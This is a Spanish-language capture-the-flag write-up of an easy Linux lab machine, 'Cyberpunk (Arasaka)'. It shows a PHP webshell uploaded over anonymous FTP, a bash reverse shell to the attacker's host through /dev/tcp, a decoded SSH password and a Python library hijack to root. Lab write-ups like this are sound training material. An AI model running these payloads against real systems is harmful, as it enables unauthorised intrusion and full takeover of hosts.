# 🤖 Cyberpunk (Arasaka)

```bash
┌──(Harou㉿kali)-[~/writeups/arasaka]
└─$ cat info.txt

  Plataforma  : The Hackers Labs
  Dificultad  : 🟢 Fácil
  Sistema     : Linux
  Fecha       : 18/03/2026
  Estado      : ✅ Completada
```

---

## 🎯 `cat objetivo.txt`

> Máquina Linux con FTP anónimo que comparte el directorio raíz con Apache.
> El objetivo es subir una webshell vía FTP, obtener una reverse shell,
> decodificar credenciales en Brainfuck para movimiento lateral y
> explotar Python Library Hijacking para escalar a root.

---

## 🔍 `./reconnaissance.sh`

### Escaneo de puertos

```bash
sudo nmap -p- --open -sCV -Pn -n --min-rate 5000 192.168.0.24
```

**Puertos abiertos:**
| Puerto | Servicio | Notas |
|--------|----------|-------|
| 21/TCP | FTP | Acceso anónimo habilitado ⚠️ |
| 80/TCP | HTTP | Apache — mismo directorio que FTP |
| 22/TCP | SSH | Administración remota |

---

## ⚡ `./exploitation.sh`

### Fase 1 — Acceso inicial via FTP + WebShell

**Conexión FTP anónima:**

```bash
ftp 192.168.0.24
# Usuario: anonymous
# Password: [vacío]
```

**Verificación de permisos:**

```bash
ftp> ls -la
# drwxrwxrwx → escritura total en el directorio raíz
```

> 💡 El FTP comparte el mismo directorio que Apache — cualquier archivo
> subido es accesible directamente desde el navegador.

**Creación y subida de la WebShell:**

```bash
echo '<?php system($_GET["cmd"]); ?>' > exploit.php
ftp> put exploit.php
```

**Listener en Kali:**

```bash
nc -lvnp 4444
```

**Ejecución de reverse shell desde el navegador:**

```
http://192.168.0.24/exploit.php?cmd=bash -c "bash -i >%26 /dev/tcp/192.168.0.21/4444 0>%261"
```

**Acceso obtenido como:** `www-data`

---

## 🔀 `./lateral_movement.sh`

### Fase 2 — Movimiento lateral: www-data → arasaka

**Estabilización de la TTY:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**Enumeración de usuarios y archivos:**

```bash
ls -la /home
# Usuario identificado: arasaka

find / -path /proc -prune -o -name "*.txt" -print 2>/dev/null
# Hallazgo: /opt/arasaka.txt
```

**Contenido del archivo:**

```bash
cat /opt/arasaka.txt
# Cadena codificada en Brainfuck
```

> 💡 Brainfuck es un lenguaje esotérico usado a veces para ofuscar
> contraseñas. Decodificable en: https://www.dcode.fr/brainfuck-language

**Credencial obtenida tras decodificar:**
```
Cyberpunk2024
```

**Salto de usuario vía SSH:**

```bash
ssh arasaka@192.168.0.24
# Password: Cyberpunk2024
```

---

## 🏁 `cat flags.txt`

### User flag

```bash
cat /home/arasaka/user.txt
```

```
41311c28da287ef8acf6ad429c42c5d2
```

---

## 🚀 `./privesc.sh`

### Fase 3 — Escalada de privilegios: arasaka → root

**Auditoría de permisos sudo:**

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3.11 /home/arasaka/randombase64.py
```

**Análisis del script:**

```bash
cat /home/arasaka/randombase64.py
# El script contiene: import base64
```

> 💡 Python busca módulos importados primero en el directorio actual.
> Si creamos un `base64.py` malicioso ahí, Python lo cargará antes
> que el módulo legítimo — esto es **Python Library Hijacking**.

**Explotación:**

```bash
echo 'import os; os.system("/bin/bash")' > /home/arasaka/base64.py
sudo /usr/bin/python3.11 /home/arasaka/randombase64.py
```

**Resultado:** Shell como root — `uid=0`. ✅

### Root flag

```bash
cat /root/root.txt
```

```
344a4a8f53d36e7449957489701b040f
```

---

## 🧠 `cat lecciones.txt`

- 💡 FTP anónimo con escritura es crítico si comparte directorio con Apache — permite subir webshells directamente.
- 💡 Siempre buscar archivos `.txt` en `/opt` y directorios de usuario — suelen contener credenciales ocultas.
- 💡 Las contraseñas pueden estar ofuscadas en Brainfuck, Base64 o ROT13 — aprender a reconocerlos es clave.
- 💡 Python Library Hijacking: si un script sudo importa un módulo y tenemos escritura en su directorio, podemos secuestrarlo.
- 💡 Siempre analizar el script completo al ver `sudo -l` — los imports son el punto débil.

---

## 🛠️ `cat herramientas.txt`

```
nmap · ftp · netcat · php (webshell) · python3 · ssh · dcode.fr (Brainfuck)
```

---

## 🔗 `cat referencias.txt`

```
Brainfuck decoder     : https://www.dcode.fr/brainfuck-language
Python Library Hijack : https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
The Hackers Labs      : https://thehackerslabs.com
```

---

<div align="center">

*`📚 Writeup educativo — The Hackers Labs | Cyberpunk (Arasaka) | Fácil`*

</div>
